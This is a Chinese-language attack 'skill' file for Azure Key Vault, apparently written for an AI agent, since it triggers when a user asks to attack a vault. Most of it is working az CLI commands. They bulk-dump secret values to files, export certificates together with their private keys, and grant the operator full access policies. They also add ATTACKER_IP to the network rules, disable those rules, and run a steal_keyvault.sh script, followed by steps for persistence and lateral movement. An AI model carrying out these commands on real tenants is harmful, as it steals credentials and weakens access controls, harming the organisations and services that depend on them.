---
name: azure-keyvault-attack
type: attack
category: secrets-manager
platform: azure
severity: critical
---

# Azure Key Vault 攻击技能

## 触发条件

- 有 Azure 凭证
- 目标使用 Key Vault
- 用户要求"攻击 Key Vault"

## 前置检查

```bash
# 1. 登录 Azure
az login

# 2. 设置订阅
az account set --subscription SUBSCRIPTION_ID

# 3. 列出 Key Vault
az keyvault list --query "[].name" -o tsv
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尗举 Key Vault
az keyvault list --query "[].{Name:name, ResourceGroup:resourceGroup}" -o json

# 2. 获取 Key Vault 详情
az keyvault show --name KEYVAULT_NAME --resource-group RESOURCE_GROUP

# 3. 检查访问策略
az keyvault show --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --query "properties.accessPolicies"

# 4. 测试访问权限
az keyvault key list --vault-name KEYVAULT_NAME
az keyvault secret list --vault-name KEYVAULT_NAME
az keyvault certificate list --vault-name KEYVAULT_NAME
```

### 方法 2: 秘密窃取

```bash
# 1. 列出所有秘密
az keyvault secret list --vault-name KEYVAULT_NAME --query "[].name" -o tsv

# 2. 获取特定秘密
az keyvault secret show --vault-name KEYVAULT_NAME --name SECRET_NAME

# 3. 批量下载所有秘密
for secret in $(az keyvault secret list --vault-name KEYVAULT_NAME --query "[].name" -o tsv); do
  echo "=== $secret ==="
  az keyvault secret show --vault-name KEYVAULT_NAME --name $secret \
    --query "value" -o tsv
done > /tmp/keyvault-secrets.txt

# 4. 搜索敏感秘密
az keyvault secret list --vault-name KEYVAULT_NAME | \
  grep -i -E "password|secret|token|connection|credential"
```

### 方法 3: Key 利用

```bash
# 1. 列出所有密钥
az keyvault key list --vault-name KEYVAULT_NAME --query "[].kid.name" -o tsv

# 2. 获取密钥详情
az keyvault key show --vault-name KEYVAULT_NAME --name KEY_NAME

# 3. 导出公钥
az keyvault key download --vault-name KEYVAULT_NAME --name KEY_NAME -f /tmp/key.pem

# 4. 如果有备份权限，备份密钥
az keyvault key backup --vault-name KEYVAULT_NAME --name KEY_NAME -f /tmp/key-backup.blob
```

### 方法 4: 证书窃取

```bash
# 1. 列出所有证书
az keyvault certificate list --vault-name KEYVAULT_NAME --query "[].name" -o tsv

# 2. 获取证书详情
az keyvault certificate show --vault-name KEYVAULT_NAME --name CERT_NAME

# 3. 导出证书（包括私钥）
az keyvault certificate download --vault-name KEYVAULT_NAME --name CERT_NAME -f /tmp/cert.pfx

# 4. 提取私钥密码
az keyvault secret show --vault-name KEYVAULT_NAME --name CERT-NAME-pwd
```

### 方法 5: 访问策略绕过

```bash
# 1. 获取当前访问策略
az keyvault show --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --query "properties.accessPolicies"

# 2. 如果有权限，添加自己
USER_ID=$(az ad signed-in-user show --query "objectId" -o tsv)
az keyvault set-policy --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --object-id $USER_ID \
  --key-permissions get list unwrapkey wrapkey \
  --secret-permissions get list set

# 3. 或添加 Service Principal
az keyvault set-policy --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --spn CLIENT_ID \
  --secret-permissions get list set
```

### 方法 6: RBAC 利用

```bash
# 1. 检查 RBAC 权限
az role assignment list --scope /subscriptions/SUB_ID/resourceGroups/RG/providers/Microsoft.KeyVault/vaults/KEYVAULT_NAME

# 2. 如果有 Key Vault Contributor 权限
# 可以修改访问策略

# 3. 创建新的访问策略
az keyvault set-policy --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --object-id OBJECT_ID \
  --secret-permissions backup delete get list purge recover restore set

# 4. 或授予所有权限
az keyvault set-policy --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --object-id OBJECT_ID \
  --key-permissions all \
  --secret-permissions all \
  --certificate-permissions all
```

### 方法 7: 软删除利用

```bash
# 1. 列出已删除的 Key Vault
az keyvault list-deleted --query "[].name" -o tsv

# 2. 恢复已删除的 Key Vault
az keyvault recover --name DELETED_VAULT_NAME

# 3. 列出已删除的秘密
az keyvault secret list-deleted --vault-name KEYVAULT_NAME

# 4. 恢复已删除的秘密
az keyvault secret recover --vault-name KEYVAULT_NAME --name DELETED_SECRET_NAME
```

### 方法 8: 网络规则绕过

```bash
# 1. 获取网络规则
az keyvault show --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --query "properties.networkAcls"

# 2. 如果有权限，修改网络规则
az keyvault update --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --bypass AzureServices

# 3. 添加允许的 IP
az keyvault network-rule add --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --ip-address ATTACKER_IP/32

# 4. 禁用网络规则
az keyvault update --name KEYVAULT_NAME --resource-group RESOURCE_GROUP \
  --default-action Allow
```

### 方法 9: 密钥操作利用

```bash
# 1. 使用密钥加密数据
az keyvault key encrypt --vault-name KEYVAULT_NAME --name KEY_NAME \
  --algorithm RSA-OAEP --plaintext "sensitive data"

# 2. 使用密钥解密数据
az keyvault key decrypt --vault-name KEYVAULT_NAME --name KEY_NAME \
  --algorithm RSA-OAEP --encrypted-value ENCRYPTED_DATA

# 3. 签名数据
az keyvault key sign --vault-name KEYVAULT_NAME --name KEY_NAME \
  --algorithm ES256K --digest DIGEST_VALUE

# 4. 验证签名
az keyvault key verify --vault-name KEYVAULT_NAME --name KEY_NAME \
  --algorithm ES256K --digest DIGEST_VALUE --signature SIGNATURE
```

### 方法 10: 自动化密钥窃取

```bash
# 1. 创建自动化脚本
cat > steal_keyvault.sh <<'EOF'
#!/bin/bash

# 获取所有 Key Vault
vaults=$(az keyvault list --query "[].name" -o tsv)

for vault in $vaults; do
  echo "=== Key Vault: $vault ==="

  # 获取所有秘密
  echo "Secrets:"
  for secret in $(az keyvault secret list --vault-name $vault --query "[].name" -o tsv); do
    echo "  - $secret: $(az keyvault secret show --vault-name $vault --name $secret --query "value" -o tsv)"
  done

  # 获取所有密钥
  echo "Keys:"
  for key in $(az keyvault key list --vault-name $vault --query "[].kid.name" -o tsv); do
    echo "  - $key"
  done

  # 获取所有证书
  echo "Certificates:"
  for cert in $(az keyvault certificate list --vault-name $vault --query "[].name" -o tsv); do
    echo "  - $cert"
  done

  echo ""
done > /tmp/keyvault-data.txt
EOF

# 2. 执行脚本
chmod +x steal_keyvault.sh
./steal_keyvault.sh

# 3. 导出所有证书和密钥
for vault in $(az keyvault list --query "[].name" -o tsv); do
  for cert in $(az keyvault certificate list --vault-name $vault --query "[].name" -o tsv); do
    az keyvault certificate download --vault-name $vault --name $cert -f /tmp/$vault-$cert.pfx
  done
done
```

## 验证成功

```bash
# 成功列出 Key Vault
az keyvault list

# 成功获取秘密
az keyvault secret show --vault-name KEYVAULT_NAME --name SECRET_NAME

# 成功列出密钥
az keyvault key list --vault-name KEYVAULT_NAME
```

## 下一步

1. 分析窃取的密钥和证书
2. 使用证书和密钥访问其他 Azure 服务
3. 通过 Key Vault 建立持久化
4. 攻击使用 Key Vault 的应用程序
